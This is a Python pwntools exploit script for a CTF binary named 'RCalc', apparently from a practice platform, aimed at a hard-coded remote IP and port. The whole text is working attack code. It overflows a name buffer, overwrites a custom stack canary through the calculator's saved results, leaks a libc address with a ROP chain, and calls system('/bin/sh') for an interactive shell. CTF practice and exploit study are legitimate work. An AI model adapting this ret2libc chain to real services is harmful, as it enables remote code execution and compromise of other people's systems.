from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

elf = ELF('./RCalc')
# io = process('./RCalc')
io = remote('111.200.241.244', 62572)

pop_rdi_ret_addr = 0x401123
main_addr = 0x401036

print(hex(elf.got['puts']))
print(hex(elf.plt['puts']))

def cal(op1, op2):
	io.sendlineafter(b'Your choice:', b'1')
	io.sendlineafter(b'2 integer: ', str(op1).encode() + b'\n' + \
									 str(op2).encode())
	io.sendlineafter(b'Save the result? ', b'yes')

payload1 = cyclic(264) + b'\x00' * 16 + p64(pop_rdi_ret_addr) + \
		   p64(elf.got['__libc_start_main']) + p64(elf.plt['printf']) + \
		   p64(main_addr) * 2
# payload1 = cyclic(264) + b'\x00' * 16 + p64(main_addr) * 2
		   
io.sendlineafter(b'Input your name pls: ', payload1)

for i in range(32):
	cal(123, 123)

cal(0, 0)
cal(int('331', 16), 0)
cal(0, 0)		# change the first canary
# pause()
io.sendlineafter(b'Your choice:', b'5')

mem_addr = u64(io.recvuntil(b'Input')[0:6] + b'\x00\x00')

libc = LibcSearcher('__libc_start_main', mem_addr)

base = mem_addr - libc.dump('__libc_start_main')

mem_sys_addr = base + libc.dump('system') # elf.symbols['system']
mem_binsh_addr = base + libc.dump('str_bin_sh') # next(elf.search(b'/bin/sh'))

payload2 = cyclic(264) + b'\x00' * 16 + p64(pop_rdi_ret_addr) + \
		   p64(mem_binsh_addr) + p64(mem_sys_addr)
io.sendlineafter(b'your name pls: ', payload2)

for i in range(32):
	cal(123, 123)
cal(0, 0)
cal(int('331', 16), 0)
cal(0, 0)		# change the first canary

io.interactive()